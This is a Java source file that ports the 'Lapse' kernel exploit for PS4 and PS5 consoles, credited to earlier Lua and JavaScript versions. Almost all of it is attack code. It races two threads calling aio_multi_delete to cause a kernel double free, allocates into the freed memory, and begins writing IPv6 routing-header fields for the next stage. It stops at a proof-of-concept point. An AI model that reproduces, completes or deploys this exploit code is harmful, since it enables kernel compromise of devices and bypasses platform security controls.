// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 anonymous - Lapse
// Copyright (C) 2025 Kimari - Java port

package org.bdj.lapse;

/* Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20) disclosed by an anonymous
 * developer ("abc") in 2025. Credit goes to abc for the proof-of-concept, Al-Azif for lapse.mjs,
 * and shahrilnet and znull_ptr for lapse.lua. BlueLapse primarily references the latter.
 *
 * https://www.psdevwiki.com/ps4/Vulnerabilities#FW_5.00-12.02_-_Double_free_due_to_aio_multi_delete()_improper_locking
 * https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
 * https://github.com/Al-Azif/psfree-lapse/blob/main/src/lapse.mjs
 *
 * Any code in BlueLapse based on work from lapse.lua or lapse.mjs is available under the GNU Affero
 * General Public License. See the LICENSE file in the repository root for details.
 */

import org.bdj.UITextConsole;
import org.bdj.api.API;
import org.bdj.lapse.LibKernel.PthreadBarrier;
import org.bdj.lapse.LibKernel.AioErrorArray;
import org.bdj.lapse.LibKernel.AioRWRequestArray;
import org.bdj.lapse.LibKernel.AioSubmitIdArray;

public class Lapse extends Thread {
	public final LibKernel k;
	public final API api;
	public final LibC c;
	public final UITextConsole console;

	public Lapse(LibKernel libkernel, UITextConsole console) {
		k = libkernel;
		api = k.api;
		c = k.libc;
		this.console = console;
	}

	public void run() {
		try {
			exploit();
		} catch (Throwable e) {
			console.add(e);
		} finally {
			cleanup();
		}
	}

	public static final int NUM_TRIES = 1000;
	public static final int NUM_AIO_REQUESTS = 3;
	public static final int WHICH_REQUEST = NUM_AIO_REQUESTS - 1;

	private void exploit() throws Throwable {
		AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_AIO_REQUESTS);
		AioSubmitIdArray ids = k.new AioSubmitIdArray(NUM_AIO_REQUESTS);
		AioSubmitIdArray deleteIds = ids.slice(WHICH_REQUEST, 1);
		AioErrorArray mainErr = k.new AioErrorArray(1);
		AioErrorArray raceErr = k.new AioErrorArray(1);
		PthreadBarrier barrier = k.new PthreadBarrier();

		final int SIZE = 0x80;
		long buf = 0;

		// Bare minimum initialization to succeed in calling aio_submit_cmd()
		for (int i = 0; i < NUM_AIO_REQUESTS; i++) {
			reqs.get(i).fd.set(-1);
		}

		boolean success = false;
		for (int i = 0; i < NUM_TRIES; i++) {
			// Issue requests and get back submission IDs to use later
			// Command and priority do not matter but the MULTI flag is required
			k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_WRITE, reqs, ids);

			// You cannot delete any request that is already being processed by a
			// SceFsstAIO worker thread.
			// We just wait on all of them instead of polling and checking whether
			// a request is being processed. Polling is also error-prone since the
			// result can become out of date.
			k.aioMultiWait(ids, null, LibKernel.AIO_WAIT_AND);

			RaceThread racer = new RaceThread(barrier, deleteIds, raceErr);
			racer.start();

			// Sync point between threads
			barrier.barrierWait();

			// Hopefully both threads will call aio_multi_delete at the same time
			k.aioMultiDelete(deleteIds, mainErr);

			// Wait for race thread to finish
			racer.join();

			// If it worked this should give us a block that the kernel thinks is... what?
			// In kernel memory?
			buf = api.malloc(SIZE);

			// Read errors. The race is successful if they are both zero.
			int m = mainErr.get(0).id.get();
			int r = raceErr.get(0).id.get();
			if (m == 0 && r == 0) {
				console.add("Lapse: attempt " + i + ": double free achieved!");
				console.add("-> errors: 0x" + Integer.toHexString(m) + " 0x" + Integer.toHexString(r));
				console.add("-> rthdr buffer: 0x" + Long.toHexString(buf));
				success = true;
				break;
			}

			// Touching the console here may or may not screw with the timing?
			// console.add("Lapse: attempt " + i + ": failed, alloc'd 0x" + Long.toHexString(buf));
			// console.add("-> errors: 0x" + Integer.toHexString(m) + " 0x" + Integer.toHexString(r));
		}

		if (!success) {
			console.add("Lapse: " + NUM_TRIES + " attempts failed");
			return;
		}

		// Continue with make_aliased_rthdrs from lapse.lua/mjs

		int len = ((SIZE >> 3) - 1) & (~1);
		// int size = (len + 1) << 3;
		api.write8(buf,   (byte)0);          // ip6r_nxt
		api.write8(buf+1, (byte)len);        // ip6r_len
		api.write8(buf+2, (byte)0);          // ip6r_type
		api.write8(buf+3, (byte)(len >> 1)); // ip6r_segleft

		console.add("Lapse: end of PoC");
	}

	private class RaceThread extends Thread {
		private PthreadBarrier barrier;
		private AioSubmitIdArray ids;
		private AioErrorArray errors;

		public RaceThread(PthreadBarrier barrier, AioSubmitIdArray ids, AioErrorArray errors) {
			this.barrier = barrier;
			this.ids = ids;
			this.errors = errors;
		}

		public void run() {
			// Sync point between threads
			barrier.barrierWait();

			// Hopefully both threads will call aio_multi_delete at the same time
			k.aioMultiDelete(ids, errors);
		}
	}

	private void cleanup() {

	}
}
